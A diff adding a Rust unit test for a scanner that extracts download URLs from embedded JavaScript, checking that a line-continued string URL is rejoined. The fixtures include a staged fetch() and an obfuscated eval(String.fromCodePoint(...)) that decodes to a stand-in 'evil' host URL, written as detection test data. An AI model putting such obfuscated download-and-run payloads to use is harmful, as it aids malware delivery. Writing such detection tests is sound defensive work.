@@ -18412,6 +18412,25 @@ mod js_url_extraction_tests {
     }
 
     #[test]
+    fn js_string_line_continuation_joins_url() {
+        let mut env = Environment::new(&Config::default());
+        let js = b"fetch(\"https://js-line-cont.example/sta\\\r\nge\")".to_vec();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. }
+                        if src == "https://js-line-cont.example/stage"
+                )
+            }),
+            "JS line-continuation URL was not joined: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn js_fromcodepoint_payload_url_extracted() {
         let mut env = Environment::new(&Config::default());
         let js = br#"eval(String.fromCodePoint(104,116,116,112,58,47,47,101,118,105,108,46,101,120,97,109,112,108,101,47,120))"#.to_vec();
